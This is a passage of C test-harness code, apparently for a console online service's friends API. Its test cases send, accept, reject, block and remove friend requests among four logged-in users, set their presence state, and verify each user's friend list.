				bExpectedResult = FALSE;
			}

			PUMP_CS_AND_EXIT_IF_FAILED
		}
	}

	if(bExpectedResult)
	{
		PASS_TESTCASE("Retrieved friend list for all users")
	}
	else
	{
		FAIL_TESTCASE("Unexpected friends are in the list")
	}
	
	END_TESTCASE
	xSetFunctionName(hLog, "");



	// Have user 1 invite users 2, 3 and 4
//===================================================================
	xSetFunctionName(hLog, "XOnlineFriendsRequest");
	START_TESTCASE("Inviting friends")
//===================================================================

	for(dwUserIndex = 1; dwUserIndex < XONLINE_MAX_LOGON_USERS; ++dwUserIndex)
	{
		xLog(hLog, XLL_INFO, "User 1 is inviting user %u", dwUserIndex + 1);

		hr = XOnlineFriendsRequest(0, g_LoggedOnUsers[dwUserIndex].xuid);
		if(hr != S_OK){
			FAIL_TESTCASE("XOnlineFriendsRequest failed unexpectedly");
			bExpectedResult = FALSE;
			break;
		}

		PUMP_CS_AND_EXIT_IF_FAILED
	}

	if(bExpectedResult)
	{
		PASS_TESTCASE("Invited friends successfully")
	}
	else
	{
		FAIL_TESTCASE("Inviting friends failed")
	}

	END_TESTCASE
	xSetFunctionName(hLog, "");

	// Get friend list for each user
//===================================================================
	xSetFunctionName(hLog, "XOnlineFriendsGetLatest");
	START_TESTCASE("Get friend list for each user #3");
//===================================================================

	bExpectedResult = FALSE;
	dwStartTickCount = GetTickCount();

	while(!bExpectedResult && !IsTimeFinished(dwStartTickCount, ALLOWEDPUMPINGTIME))
	{
		bExpectedResult = TRUE;

		nResult = PumpFriendTask(hLog, hLogonTask, hGameOpTask, hEnumGamesTask, hLockoutTask, 3, &hReturn);
		if(nResult == SY_STOPWHOLETEST)	// Pump LogonTask failed
		{
			xEndVariation(hLog);
			goto Exit;
		}
		else if(nResult == SY_STOPTESTCASE)
		{
			bExpectedResult = FALSE;
			break;
		}
		
		for(dwUserIndex = 0; bExpectedResult && (dwUserIndex < XONLINE_MAX_LOGON_USERS); ++dwUserIndex)
		{


			xLog(hLog, XLL_INFO, "Getting friend list for user %u", dwUserIndex + 1);

			pCurrentFriendList = (PXONLINE_FRIEND) (pFriendBuffers + (dwUserIndex * sizeof(XONLINE_FRIEND) * MAX_FRIENDS));

			memset(pCurrentFriendList, 0, sizeof(XONLINE_FRIEND) * MAX_FRIENDS);

			dwNumFriends = XOnlineFriendsGetLatest(dwUserIndex, MAX_FRIENDS, pCurrentFriendList);

			DisplayFriendList(hLog, dwNumFriends, pCurrentFriendList);

			PUMP_CS_AND_EXIT_IF_FAILED

			// Check the specific friend list and verify that all entries are correct
			switch(dwUserIndex)
			{
			case 0:
				dwNumOfExpectedFriend = 3;
				
				pFriendListExpected = (XONLINE_FRIEND *)LocalAlloc(LPTR, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );
				memset(pFriendListExpected , 0, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );

				pFriendListExpected[0].xuid.qwUserID = g_LoggedOnUsers[1].xuid.qwUserID;
				strcpy(pFriendListExpected[0].username, g_LoggedOnUsers[1].name);
				pFriendListExpected[0].friendState = XONLINE_FRIENDSTATE_FLAG_PENDING;
				pFriendListExpected[0].sessionID.ab[0] = 0;
				pFriendListExpected[0].titleID = 0;
				pFriendListExpected[0].StateDataSize = 0;

				pFriendListExpected[1].xuid.qwUserID = g_LoggedOnUsers[2].xuid.qwUserID;
				strcpy(pFriendListExpected[1].username, g_LoggedOnUsers[2].name);
				pFriendListExpected[1].friendState = XONLINE_FRIENDSTATE_FLAG_PENDING;
				pFriendListExpected[1].sessionID.ab[0] = 0;
				pFriendListExpected[1].titleID = 0;
				pFriendListExpected[1].StateDataSize = 0;
				
				pFriendListExpected[2].xuid.qwUserID = g_LoggedOnUsers[3].xuid.qwUserID;
				strcpy(pFriendListExpected[2].username, g_LoggedOnUsers[3].name);
				pFriendListExpected[2].friendState = XONLINE_FRIENDSTATE_FLAG_PENDING;
				pFriendListExpected[2].sessionID.ab[0] = 0;
				pFriendListExpected[2].titleID = 0;
				pFriendListExpected[2].StateDataSize = 0;

				bExpectedResult = IsValidResultForFriendList(hLog, dwNumOfExpectedFriend, dwNumFriends, pFriendListExpected, pCurrentFriendList);

				LocalFree(pFriendListExpected);
				break;

			case 1:
			case 2:
			case 3:
				dwNumOfExpectedFriend = 1;
				
				pFriendListExpected = (XONLINE_FRIEND *)LocalAlloc(LPTR, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );
				memset(pFriendListExpected , 0, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );

				pFriendListExpected[0].xuid.qwUserID = g_LoggedOnUsers[0].xuid.qwUserID;
				strcpy(pFriendListExpected[0].username, g_LoggedOnUsers[0].name);
				pFriendListExpected[0].friendState = XONLINE_FRIENDSTATE_FLAG_REQUEST;
				pFriendListExpected[0].sessionID.ab[0] = 0;
				pFriendListExpected[0].titleID = 0;
				pFriendListExpected[0].StateDataSize = 0;

				bExpectedResult = IsValidResultForFriendList(hLog, dwNumOfExpectedFriend, dwNumFriends, pFriendListExpected, pCurrentFriendList);

				LocalFree(pFriendListExpected);
				break;

			default:
				FAIL_TESTCASE("Unexpected user index")
				bExpectedResult = FALSE;
				break;
			}
		}
	}
	
	// Verify presence of friends in user 0's list
	if(bExpectedResult)
	{
		for(dwCounter1 = 0; dwCounter1 < (XONLINE_MAX_LOGON_USERS - 1); ++dwCounter1)
		{
			pCurrentFriendList = (PXONLINE_FRIEND) pFriendBuffers;

			if(!pCurrentFriendList[dwCounter1].xuid.qwUserID)
			{
				xLog(hLog, XLL_INFO, "Friend %u missing from user 1's list.", dwCounter1 + 1);
				FAIL_TESTCASE("Expected friend missing")
				break;
			}
		}
	}
	else
	{
		FAIL_TESTCASE("Unxxpected friend list")
	}

	if(bExpectedResult)
	{
		PASS_TESTCASE("Retrieved friend lists for all users");
	}
	else
	{
		FAIL_TESTCASE("Retrieving friend lists for all users failed");
	}
	
	END_TESTCASE;
	xSetFunctionName(hLog, "");

//===================================================================
	xSetFunctionName(hLog, "XOnlineFriendsAnswerRequest");
	START_TESTCASE("Have user 2 accept user 1's invitation");
//===================================================================

	bExpectedResult = TRUE;
	pCurrentFriendList = (PXONLINE_FRIEND) (pFriendBuffers + (1 * sizeof(XONLINE_FRIEND) * MAX_FRIENDS));
	
	if(pCurrentFriendList[0].xuid.qwUserID != g_LoggedOnUsers[0].xuid.qwUserID)
	{
		xLog(hLog, XLL_INFO, "Friend 1 missing from user 2's list.");
		FAIL_TESTCASE("Expected friend missing");
		bExpectedResult = FALSE;
	}

	if(bExpectedResult)
	{
		hr = XOnlineFriendsAnswerRequest(1, &pCurrentFriendList[0], XONLINE_REQUEST_YES);
		if(hr != S_OK)
		{
			FAIL_TESTCASE("XOnlineFriendsAnswerRequest failed unexpectedly");
			bExpectedResult = FALSE;
		}
	}
	
	if(bExpectedResult)
	{
		PASS_TESTCASE("XOnlineFriendsAnswerRequest returned success");
	}
	else
	{
		FAIL_TESTCASE("XOnlineFriendsAnswerRequest returned fail");
	}
	
	END_TESTCASE
	xSetFunctionName(hLog, "");

//===================================================================
	xSetFunctionName(hLog, "XOnlineFriendsAnswerRequest");
	START_TESTCASE("Have user 3 reject user 1's invitation");
//===================================================================

	bExpectedResult = TRUE;
	pCurrentFriendList = (PXONLINE_FRIEND) (pFriendBuffers + (2 * sizeof(XONLINE_FRIEND) * MAX_FRIENDS));
	
	if(pCurrentFriendList[0].xuid.qwUserID != g_LoggedOnUsers[0].xuid.qwUserID)
	{
		xLog(hLog, XLL_INFO, "Friend 1 missing from user 3's list.");
		FAIL_TESTCASE("Expected friend missing");
		bExpectedResult = FALSE;
	}

	if(bExpectedResult)
	{
		hr = XOnlineFriendsAnswerRequest(2, &pCurrentFriendList[0], XONLINE_REQUEST_NO);
		if(hr != S_OK)
		{
			FAIL_TESTCASE("XOnlineFriendsAnswerRequest failed unexpectedly");
			bExpectedResult = FALSE;
		}
	}
	
	if(bExpectedResult)
	{
		PASS_TESTCASE("XOnlineFriendsAnswerRequest returned success");
	}
	else
	{
		FAIL_TESTCASE("XOnlineFriendsAnswerRequest returned fail");
	}
		
	
	END_TESTCASE
	xSetFunctionName(hLog, "");

#if SY_BLOCKING_IMPLEMENTED
//===================================================================
	xSetFunctionName(hLog, "XOnlineFriendsAnswerRequest");
	START_TESTCASE("Have user 4 block user 1's invitation");
//===================================================================

	pCurrentFriendList = (PXONLINE_FRIEND) (pFriendBuffers + (3 * sizeof(XONLINE_FRIEND) * MAX_FRIENDS));
	
	if(pCurrentFriendList[0].xuid.qwUserID != g_LoggedOnUsers[0].xuid.qwUserID)
	{
		xLog(hLog, XLL_INFO, "Friend 1 missing from user 4's list.");
		FAIL_TESTCASE("Expected friend missing");
	}

	hr = XOnlineFriendsAnswerRequest(3, &pCurrentFriendList[0], XONLINE_REQUEST_BLOCK);

	if(hr == S_OK)
	{
		PASS_TESTCASE("XOnlineFriendsAnswerRequest returned success");
	}
	{
		FAIL_TESTCASE("XOnlineFriendsAnswerRequest failed unexpectedly");
	}

	END_TESTCASE
	xSetFunctionName(hLog, "");
#endif

//===================================================================
	xSetFunctionName(hLog, "XOnlineFriendsGetLatest");
	START_TESTCASE("Get friend list for each user #4");
//===================================================================

	bExpectedResult = FALSE;
	dwStartTickCount = GetTickCount();

	while(!bExpectedResult && !IsTimeFinished(dwStartTickCount, ALLOWEDPUMPINGTIME))
	{
		bExpectedResult = TRUE;

		nResult = PumpFriendTask(hLog, hLogonTask, hGameOpTask, hEnumGamesTask, hLockoutTask, 4, &hReturn);
		if(nResult == SY_STOPWHOLETEST)	// Pump LogonTask failed
		{
			xEndVariation(hLog);
			goto Exit;
		}
		else if(nResult == SY_STOPTESTCASE)
		{
			bExpectedResult = FALSE;		
			break;
		}
		for(dwUserIndex = 0; bExpectedResult && (dwUserIndex < XONLINE_MAX_LOGON_USERS); ++dwUserIndex)
		{
			xLog(hLog, XLL_INFO, "Getting friend list for user %u", dwUserIndex + 1);

			pCurrentFriendList = (PXONLINE_FRIEND) (pFriendBuffers + (dwUserIndex * sizeof(XONLINE_FRIEND) * MAX_FRIENDS));

			memset(pCurrentFriendList, 0, sizeof(XONLINE_FRIEND) * MAX_FRIENDS);

			dwNumFriends = XOnlineFriendsGetLatest(dwUserIndex, MAX_FRIENDS, pCurrentFriendList);

			DisplayFriendList(hLog, dwNumFriends, pCurrentFriendList);

			PUMP_CS_AND_EXIT_IF_FAILED

			// Check the specific friend list and verify that all entries are correct
			switch(dwUserIndex)
			{
			case 0:
#if SY_BLOCKING_IMPLEMENTED				
				dwNumOfExpectedFriend = 1;
				
				pFriendListExpected = (XONLINE_FRIEND *)LocalAlloc(LPTR, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );
				memset(pFriendListExpected , 0, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );

				pFriendListExpected[0].xuid.qwUserID = g_LoggedOnUsers[1].xuid.qwUserID;
				strcpy(pFriendListExpected[0].username, g_LoggedOnUsers[1].name);
				pFriendListExpected[0].friendState = XONLINE_FRIENDSTATE_FLAG_ONLINE;
				pFriendListExpected[0].sessionID.ab[0] = 0;
				pFriendListExpected[0].titleID = HARNESS_TITLE_ID;
				pFriendListExpected[0].StateDataSize = 0;
#else
				dwNumOfExpectedFriend = 2;
				
				pFriendListExpected = (XONLINE_FRIEND *)LocalAlloc(LPTR, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );
				memset(pFriendListExpected , 0, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );

				pFriendListExpected[0].xuid.qwUserID = g_LoggedOnUsers[1].xuid.qwUserID;
				strcpy(pFriendListExpected[0].username, g_LoggedOnUsers[1].name);
				pFriendListExpected[0].friendState = XONLINE_FRIENDSTATE_FLAG_ONLINE;
				pFriendListExpected[0].sessionID.ab[0] = 0;
				pFriendListExpected[0].titleID = HARNESS_TITLE_ID;
				pFriendListExpected[0].StateDataSize = 0;
				
				pFriendListExpected[1].xuid.qwUserID = g_LoggedOnUsers[3].xuid.qwUserID;
				strcpy(pFriendListExpected[1].username, g_LoggedOnUsers[3].name);
				pFriendListExpected[1].friendState = XONLINE_FRIENDSTATE_FLAG_PENDING;
				pFriendListExpected[1].sessionID.ab[0] = 0;
				pFriendListExpected[1].titleID = 0;
				pFriendListExpected[1].StateDataSize = 0;
#endif				

				bExpectedResult = IsValidResultForFriendList(hLog, dwNumOfExpectedFriend, dwNumFriends, pFriendListExpected, pCurrentFriendList);

				LocalFree(pFriendListExpected);
				break;				

			case 1:
				dwNumOfExpectedFriend = 1;
				
				pFriendListExpected = (XONLINE_FRIEND *)LocalAlloc(LPTR, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );
				memset(pFriendListExpected , 0, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );

				pFriendListExpected[0].xuid.qwUserID = g_LoggedOnUsers[0].xuid.qwUserID;
				strcpy(pFriendListExpected[0].username, g_LoggedOnUsers[0].name);
				pFriendListExpected[0].friendState = XONLINE_FRIENDSTATE_FLAG_ONLINE;
				pFriendListExpected[0].sessionID.ab[0] = 0;
				pFriendListExpected[0].titleID = HARNESS_TITLE_ID;
				pFriendListExpected[0].StateDataSize = 0;

				bExpectedResult = IsValidResultForFriendList(hLog, dwNumOfExpectedFriend, dwNumFriends, pFriendListExpected, pCurrentFriendList);

				LocalFree(pFriendListExpected);
				break;
			case 2:
				if(dwNumFriends != 0){
					FAIL_TESTCASE("Unexpected number of friends in list");			
					bExpectedResult = FALSE;
				}
				break;
			case 3:
#if SY_BLOCKING_IMPLEMENTED				
				if(dwNumFriends != 0){
					FAIL_TESTCASE("Unexpected number of friends in list");			
					bExpectedResult = FALSE;
				}
#else
				dwNumOfExpectedFriend = 1;
				
				pFriendListExpected = (XONLINE_FRIEND *)LocalAlloc(LPTR, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );
				memset(pFriendListExpected , 0, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );

				pFriendListExpected[0].xuid.qwUserID = g_LoggedOnUsers[0].xuid.qwUserID;
				strcpy(pFriendListExpected[0].username, g_LoggedOnUsers[0].name);
				pFriendListExpected[0].friendState = XONLINE_FRIENDSTATE_FLAG_REQUEST;
				pFriendListExpected[0].sessionID.ab[0] = 0;
				pFriendListExpected[0].titleID = 0;
				pFriendListExpected[0].StateDataSize = 0;

				bExpectedResult = IsValidResultForFriendList(hLog, dwNumOfExpectedFriend, dwNumFriends, pFriendListExpected, pCurrentFriendList);

				LocalFree(pFriendListExpected);
#endif				
				break;
			default:
				FAIL_TESTCASE("Unexpected user index");
				bExpectedResult = FALSE;
				break;
			}

		}
	}

	// TODO - check for list updates

	if(bExpectedResult)
	{
		PASS_TESTCASE("Retrieved friend lists for all users");
	}
	else
	{
		FAIL_TESTCASE("Retrieving friend lists for all users failed");
	}
	
	END_TESTCASE
	xSetFunctionName(hLog, "");

//===================================================================
	xSetFunctionName(hLog, "XOnlineNotificationSetState");
	START_TESTCASE("Set status for user 1");
//===================================================================

	bExpectedResult = TRUE;
	*((ULONGLONG *) &SessionID) = 0xAAAAAAAAAAAAAAAA;
	memset(byStateData1, 'A', MAX_STATEDATA_SIZE);

	if(!XOnlineNotificationSetState(0,
		XONLINE_FRIENDSTATE_FLAG_ONLINE | 
		XONLINE_FRIENDSTATE_FLAG_PLAYING | 
		XONLINE_FRIENDSTATE_FLAG_VOICE | 
		XONLINE_FRIENDSTATE_FLAG_JOINABLE, 
		SessionID, MAX_STATEDATA_SIZE, byStateData1))
	{
		FAIL_TESTCASE("XOnlineNotificationSetState failed unexpectedly");
		bExpectedResult = FALSE;
	}

	if(bExpectedResult)
	{
		PASS_TESTCASE("Set user 1's state");
	}
	else
	{
		FAIL_TESTCASE("Setting user 1's state failed");
	}
	
	END_TESTCASE
	xSetFunctionName(hLog, "");

//===================================================================
	xSetFunctionName(hLog, "XOnlineNotificationSetState");
	START_TESTCASE("Set status for user 2");
//===================================================================

	bExpectedResult = TRUE;
	*((ULONGLONG *) &SessionID) = 0xBBBBBBBBBBBBBBBB;
	memset(byStateData2, 'B', MAX_STATEDATA_SIZE);

	if(!XOnlineNotificationSetState(1,
		XONLINE_FRIENDSTATE_FLAG_ONLINE | 
		XONLINE_FRIENDSTATE_FLAG_PLAYING | 
		XONLINE_FRIENDSTATE_FLAG_VOICE | 
		XONLINE_FRIENDSTATE_FLAG_JOINABLE, 
		SessionID, 1, byStateData2))
	{
		FAIL_TESTCASE("XOnlineNotificationSetState failed unexpectedly");
		bExpectedResult = FALSE;
	}

	if(bExpectedResult)
	{
		PASS_TESTCASE("Set user 2's state");
	}
	else
	{
		FAIL_TESTCASE("Setting user 2's state failed");
	}
	END_TESTCASE
	xSetFunctionName(hLog, "");


//===================================================================
	xSetFunctionName(hLog, "XOnlineFriendsGetLatest");
	START_TESTCASE("Get friend lists for each user #5");
//===================================================================

	bExpectedResult = FALSE;
	dwStartTickCount = GetTickCount();

	while(!bExpectedResult && !IsTimeFinished(dwStartTickCount, ALLOWEDPUMPINGTIME))
	{
		bExpectedResult = TRUE;

		nResult = PumpFriendTask(hLog, hLogonTask, hGameOpTask, hEnumGamesTask, hLockoutTask, 5, &hReturn);
		if(nResult == SY_STOPWHOLETEST)	// Pump LogonTask failed
		{
			xEndVariation(hLog);
			goto Exit;
		}
		else if(nResult == SY_STOPTESTCASE)
		{
			bExpectedResult = FALSE;
			break;
		}
		
		for(dwUserIndex = 0; bExpectedResult && dwUserIndex < XONLINE_MAX_LOGON_USERS; ++dwUserIndex)
		{
			xLog(hLog, XLL_INFO, "Getting friend list for user %u", dwUserIndex + 1);

			pCurrentFriendList = (PXONLINE_FRIEND) (pFriendBuffers + (dwUserIndex * sizeof(XONLINE_FRIEND) * MAX_FRIENDS));

			memset(pCurrentFriendList, 0, sizeof(XONLINE_FRIEND) * MAX_FRIENDS);

			dwNumFriends = XOnlineFriendsGetLatest(dwUserIndex, MAX_FRIENDS, pCurrentFriendList);

			DisplayFriendList(hLog, dwNumFriends, pCurrentFriendList);

			PUMP_CS_AND_EXIT_IF_FAILED  // Pump the connection server in the background

			// Check the specific friend list and verify that all entries are correct
			switch(dwUserIndex)
			{
			case 0:
#if SY_BLOCKING_IMPLEMENTED				
				dwNumOfExpectedFriend = 1;
				
				pFriendListExpected = (XONLINE_FRIEND *)LocalAlloc(LPTR, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );
				memset(pFriendListExpected , 0, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );

				pFriendListExpected[0].xuid.qwUserID = g_LoggedOnUsers[1].xuid.qwUserID;
				strcpy(pFriendListExpected[0].username, g_LoggedOnUsers[1].name);
				pFriendListExpected[0].friendState = XONLINE_FRIENDSTATE_FLAG_ONLINE | 
							XONLINE_FRIENDSTATE_FLAG_PLAYING | 
							XONLINE_FRIENDSTATE_FLAG_VOICE | 
							XONLINE_FRIENDSTATE_FLAG_JOINABLE;
				*((ULONGLONG *) &(pFriendListExpected[0].sessionID)) = 0xBBBBBBBBBBBBBBBB;
				pFriendListExpected[0].titleID = HARNESS_TITLE_ID;
				pFriendListExpected[0].StateDataSize = 1;
				memcpy(pFriendListExpected[0].StateData,byStateData2,pFriendListExpected[0].StateDataSize);
#else					
				dwNumOfExpectedFriend = 2;
				
				pFriendListExpected = (XONLINE_FRIEND *)LocalAlloc(LPTR, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );
				memset(pFriendListExpected , 0, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );

				pFriendListExpected[0].xuid.qwUserID = g_LoggedOnUsers[1].xuid.qwUserID;
				strcpy(pFriendListExpected[0].username, g_LoggedOnUsers[1].name);
				pFriendListExpected[0].friendState = XONLINE_FRIENDSTATE_FLAG_ONLINE | 
							XONLINE_FRIENDSTATE_FLAG_PLAYING | 
							XONLINE_FRIENDSTATE_FLAG_VOICE | 
							XONLINE_FRIENDSTATE_FLAG_JOINABLE;
				*((ULONGLONG *) &(pFriendListExpected[0].sessionID)) = 0xBBBBBBBBBBBBBBBB;
				pFriendListExpected[0].titleID = HARNESS_TITLE_ID;
				pFriendListExpected[0].StateDataSize = 1;
				memcpy(pFriendListExpected[0].StateData,byStateData2,pFriendListExpected[0].StateDataSize);

				pFriendListExpected[1].xuid.qwUserID = g_LoggedOnUsers[3].xuid.qwUserID;
				strcpy(pFriendListExpected[1].username, g_LoggedOnUsers[3].name);
				pFriendListExpected[1].friendState = XONLINE_FRIENDSTATE_FLAG_PENDING;
				pFriendListExpected[1].sessionID.ab[0] = 0;
				pFriendListExpected[1].titleID = 0;
				pFriendListExpected[1].StateDataSize = 0;
#endif				
				
				bExpectedResult = IsValidResultForFriendList(hLog, dwNumOfExpectedFriend, dwNumFriends, pFriendListExpected, pCurrentFriendList);

				LocalFree(pFriendListExpected);
				break;

			case 1:
				dwNumOfExpectedFriend = 1;
				
				pFriendListExpected = (XONLINE_FRIEND *)LocalAlloc(LPTR, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );
				memset(pFriendListExpected , 0, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );

				pFriendListExpected[0].xuid.qwUserID = g_LoggedOnUsers[0].xuid.qwUserID;
				strcpy(pFriendListExpected[0].username, g_LoggedOnUsers[0].name);
				pFriendListExpected[0].friendState = XONLINE_FRIENDSTATE_FLAG_ONLINE | 
					XONLINE_FRIENDSTATE_FLAG_PLAYING | 
					XONLINE_FRIENDSTATE_FLAG_VOICE | 
					XONLINE_FRIENDSTATE_FLAG_JOINABLE;
				*((ULONGLONG *) &(pFriendListExpected[0].sessionID)) = 0xAAAAAAAAAAAAAAAA;
				pFriendListExpected[0].titleID = HARNESS_TITLE_ID;
				pFriendListExpected[0].StateDataSize = MAX_STATEDATA_SIZE;
				memcpy(pFriendListExpected[0].StateData,byStateData1,MAX_STATEDATA_SIZE);
					
				bExpectedResult = IsValidResultForFriendList(hLog, dwNumOfExpectedFriend, dwNumFriends, pFriendListExpected, pCurrentFriendList);

				LocalFree(pFriendListExpected);
				break;

			case 2:
				if(dwNumFriends != 0)
				{
					FAIL_TESTCASE("Unexpected number of friends in list")
					bExpectedResult = FALSE;
				}
				break;
			case 3:
#if SY_BLOCKING_IMPLEMENTED				
				if(dwNumFriends != 0)
				{
					FAIL_TESTCASE("Unexpected number of friends in list")
					bExpectedResult = FALSE;
				}
#else
				dwNumOfExpectedFriend = 1;
				
				pFriendListExpected = (XONLINE_FRIEND *)LocalAlloc(LPTR, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );
				memset(pFriendListExpected , 0, sizeof(XONLINE_FRIEND) * dwNumOfExpectedFriend );

				pFriendListExpected[0].xuid.qwUserID = g_LoggedOnUsers[0].xuid.qwUserID;
				strcpy(pFriendListExpected[0].username, g_LoggedOnUsers[0].name);
				pFriendListExpected[0].friendState = XONLINE_FRIENDSTATE_FLAG_REQUEST;
				*((ULONGLONG *) &(pFriendListExpected[0].sessionID)) = 0x0;
				pFriendListExpected[0].titleID = 0;
				pFriendListExpected[0].StateDataSize = 0;
				
				bExpectedResult = IsValidResultForFriendList(hLog, dwNumOfExpectedFriend, dwNumFriends, pFriendListExpected, pCurrentFriendList);

				LocalFree(pFriendListExpected);
#endif				
				break;

			default:
				FAIL_TESTCASE("Unexpected user index");
				bExpectedResult = FALSE;
				break;
			}
		}
	}

	// TODO - check for list updates

	if(bExpectedResult)
	{
		PASS_TESTCASE("Retrieved friend list for all users");
	}
	else
	{
		FAIL_TESTCASE("Retrieving friend list for all users failed");
	}
	
	END_TESTCASE
	xSetFunctionName(hLog, "");


//===================================================================
	xSetFunctionName(hLog, "XOnlineFriendsRemove");
	START_TESTCASE("Have user 1 remove users 2, 3 and 4");
//===================================================================

	pCurrentFriendList = (PXONLINE_FRIEND) pFriendBuffers;

	bExpectedResult = TRUE;
//	for(dwCounter1 = 0; bExpectedResult && dwCounter1 < (XONLINE_MAX_LOGON_USERS - 1); ++dwCounter1)
	for(dwCounter1 = 0; bExpectedResult && dwCounter1 < 2; ++dwCounter1)
	{
		xLog(hLog, XLL_INFO, "User 1 is removing friend %u", dwCounter1 + 1);

		if(!pCurrentFriendList[dwCounter1].xuid.qwUserID)
		{
			xLog(hLog, XLL_INFO, "Expected friend %u doesn't exist", dwCounter1 + 1);
			continue;
		}
		
		hr = XOnlineFriendsRemove(0, pCurrentFriendList + dwCounter1);
		if(hr != S_OK)
		{
			FAIL_TESTCASE("XOnlineFriendsRemove failed unexpectedly");
			bExpectedResult = FALSE;
		}

		PUMP_CS_AND_EXIT_IF_FAILED		
	}

	if(bExpectedResult)
	{
		PASS_TESTCASE("Retrieved friend lists for all users");
	}
	else
	{
		FAIL_TESTCASE("Retrieving friend lists for all users");
	}
	
	END_TESTCASE
	xSetFunctionName(hLog, "");

//===================================================================
	xSetFunctionName(hLog, "XOnlineFriendsGetLatest");
	START_TESTCASE("Get friend lists for each user #6");
//===================================================================

	bExpectedResult = FALSE;
	dwStartTickCount = GetTickCount();

	while(!bExpectedResult && !IsTimeFinished(dwStartTickCount, ALLOWEDPUMPINGTIME))
	{
		bExpectedResult = TRUE;

		nResult = PumpFriendTask(hLog, hLogonTask, hGameOpTask, hEnumGamesTask, hLockoutTask, 6, &hReturn);
		if(nResult == SY_STOPWHOLETEST)	// Pump LogonTask failed
		{
			xEndVariation(hLog);
			goto Exit;
		}
		else if(nResult == SY_STOPTESTCASE)
		{
			bExpectedResult = FALSE;
			break;
		}
		for(dwUserIndex = 0; bExpectedResult && dwUserIndex < XONLINE_MAX_LOGON_USERS; ++dwUserIndex)
		{
			xLog(hLog, XLL_INFO, "Getting friend list for user %u", dwUserIndex + 1);

			pCurrentFriendList = (PXONLINE_FRIEND) (pFriendBuffers + (dwUserIndex * sizeof(XONLINE_FRIEND) * MAX_FRIENDS));

			memset(pCurrentFriendList, 0, sizeof(XONLINE_FRIEND) * MAX_FRIENDS);

			dwNumFriends = XOnlineFriendsGetLatest(dwUserIndex, MAX_FRIENDS, pCurrentFriendList);

			DisplayFriendList(hLog, dwNumFriends, pCurrentFriendList);

			PUMP_CS_AND_EXIT_IF_FAILED

			// Check the specific friend list and verify that all entries are correct
			switch(dwUserIndex)
			{
			case 0:
			case 1:
			case 2:
			case 3:
				if(dwNumFriends != 0)
				{
					bExpectedResult = FALSE;
				}
					
				break;
			default:
				FAIL_TESTCASE("Unexpected user index");
				bExpectedResult = FALSE;
				break;
			}

		}
	}

	// TODO - check for list updates

	if(bExpectedResult)
	{
		PASS_TESTCASE("Retrieved friend list for all users");
	}
	else
	{
		FAIL_TESTCASE("Unexpected number of friends in list");
	}
		
	
	END_TESTCASE
	xSetFunctionName(hLog, "");


Exit:

	for(dwUserIndex = 0; dwUserIndex < XONLINE_MAX_LOGON_USERS; ++dwUserIndex)
	{
		xLog(hLog, XLL_INFO, "Closing friend enum handle for user %u", dwUserIndex);
		CLEANUP_TASK(hEnumGamesTask[dwUserIndex]);
	}

	CLEANUP_TASK(hGameOpTask);
	CLEANUP_TASK(hLockoutTask);
	CLEANUP_TASK(hLogonTask);

	if(hLogonEvent)
		CloseHandle(hLogonEvent);

	if(hFriendOpEvent)
		CloseHandle(hFriendOpEvent);

    hr = XOnlineCleanup();
    Verify(hr == S_OK);	

    return;
}

//==================================================================================
// IsTimeFinished
//----------------------------------------------------------------------------------
//
// Description: 
// Check if allowed time is expired
//
// Arguments:
//	DWORD	dwStart, DWORD dwAllowed
// Returns:
//	TRUE if expired.
//==================================================================================

BOOL	IsTimeFinished(DWORD	dwStart, DWORD dwAllowed)
{
	DWORD dwCurrent = GetTickCount(), dwDuration;

	if(dwCurrent < dwStart)
		dwDuration = (MAXDWORD - dwStart) + dwCurrent;
	else
		dwDuration = dwCurrent - dwStart;

	if(dwDuration > dwAllowed)
		return TRUE;
	else
		return FALSE;
}
		

//==================================================================================
// PumpFriendTask
//----------------------------------------------------------------------------------
//
// Description: Pump Friend Task periodically
//
// Arguments:
//	XONLINETASK_HANDLE hLogonTask, XONLINETASK_HANDLE hGameOpTask, XONLINETASK_HANDLE hEnumGamesTask[], UINT count
// Returns:
//	S_OK if test is finished(regardless of test result). E_FAIL if it got any whole test blocking problem.
//==================================================================================

SY_RESULT PumpFriendTask(HANDLE  hLog, XONLINETASK_HANDLE hLogonTask, XONLINETASK_HANDLE hGameOpTask, 
							XONLINETASK_HANDLE hEnumGamesTask[], XONLINETASK_HANDLE hLockoutTask, UINT count,
							HRESULT* phrReturn)
{
    HRESULT hReturn = S_OK, hrContinue;         // if this is E_FAIL, give up all test cases
    BOOL    bTestResult=TRUE; 	// if this is FALSE, give up only this case case
    DWORD 	dwCurrentTime;
    TCHAR 	szMsg[128];
    
    // Pump friend enumeration handles for each user
    for(UINT ii = 0; bTestResult && ii < FRIEND_HANDLE_PUMP_COUNT; ++ii)
    {	
    	if(hGameOpTask)
    	{
	        HRESULT hrContinue = XOnlineTaskContinue(hGameOpTask);
	        	
	        if(XONLINETASK_S_RUNNING != hrContinue)
	        {
	            xLog(hLog, XLL_FAIL, "Pumping hGameOpTask returned %0x and failed unexpectedly", hrContinue); 
	            
	            bTestResult = FALSE;
	            *phrReturn = hrContinue;
	            return SY_STOPTESTCASE;
	        }
    	}
        
        for(DWORD dwUserIndex = 0; bTestResult && dwUserIndex < XONLINE_MAX_LOGON_USERS; ++dwUserIndex)
        {
            hrContinue = XOnlineTaskContinue(hEnumGamesTask[dwUserIndex]);
            if(XONLINETASK_S_RUNNING != hrContinue && XONLINE_S_NOTIFICATION_UPTODATE != hrContinue)
            {
